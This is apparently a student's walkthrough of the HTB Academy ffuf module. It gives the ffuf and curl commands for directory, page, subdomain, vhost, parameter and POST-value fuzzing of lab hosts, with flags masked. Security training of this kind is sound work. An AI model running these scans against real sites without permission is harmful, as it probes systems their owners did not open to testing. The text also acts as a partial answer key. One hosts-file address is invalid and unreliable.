# HTB Academy - Attacking Web Applications With Ffuf


## Directory Fuzzing

>**Q. In addition to the directory we found above, there is another directory that can be found. What is it?**

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://159.65.81.48:32733/FUZZ
```

## Page Fuzzing

>**Q. Try to use what you learned in this section to fuzz the '/blog' directory and find all pages. One of them should contain a flag. What is the flag?**

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://159.65.81.48:32733/blog/indexFUZZ
```

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://159.65.81.48:32733/blog/FUZZ.php
```


## Recursive Fuzzing

>**Q. Try to repeat what you learned so far to find more files/directories. One of them should give you a flag. What is the content of the flag?**

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://159.65.81.48:32733/FUZZ  -recursion -recursion-depth 1 -e .php -v
```

## Sub-domain Fuzzing

>**Q. HackTheBox has an online Swag Shop. Try running a sub-domain fuzzing test on 'hackthebox.eu' to find it. What is the full domain of it?**

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.hackthebox.eu/
```

## Filtering Results

>**Q. Try running a VHost fuzzing scan on 'academy.htb', and see what other VHosts you get. What other VHosts did you get?**


```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://159.65.81.48:32733/ -H 'Host: FUZZ.academy.htb' -fs 986
```

## Parameter Fuzzing - GET

>**Q. Using what you learned in this section, run a parameter fuzzing scan on this page. what is the parameter accepted by this webpage?**


```bash
cat /etc/hosts
144.126.206.259 admin.academy.htb
```

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:32654/admin/admin.php?FUZZ=key -fs 798
```

## Value Fuzzing

>**Q. Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?**


```bash
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ls
cat ids.txt
```

```bash
sudo ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:32654/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768
```

```bash
curl -d "id=**" -H 'Content-Type: application/x-www-form-urlencoded' -X POST http://admin.academy.htb:32654/admin/admin.php
```

## Skills Assessment - Web

>**Q. Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)**

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://178.62.23.66:31001/ -H 'Host: FUZZ.academy.htb' -fs 985
```

>**Q. Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?**

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:31001/indexFUZZ
```

>**Q. One of the pages you will identify should say 'You don't have access!'. What is the full page URL?**

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:31001/FUZZ  -recursion -recursion-depth 1 -e .php7 -v -fs 0
```

>**Q. In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?**

```bash
sudo ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:31001/courses/***.php7?FUZZ=key -fs 774
```

>**Q. Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?**

```bash
sudo ffuf -w /usr/share/wordlists/dirb/others/names.txt:FUZZ -u http://faculty.academy.htb:31001/courses/***.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781
```

```bash
curl -d "username=***" -H 'Content-Type: application/x-www-form-urlencoded' -X POST http://faculty.academy.htb:31001/courses/***.php7
```
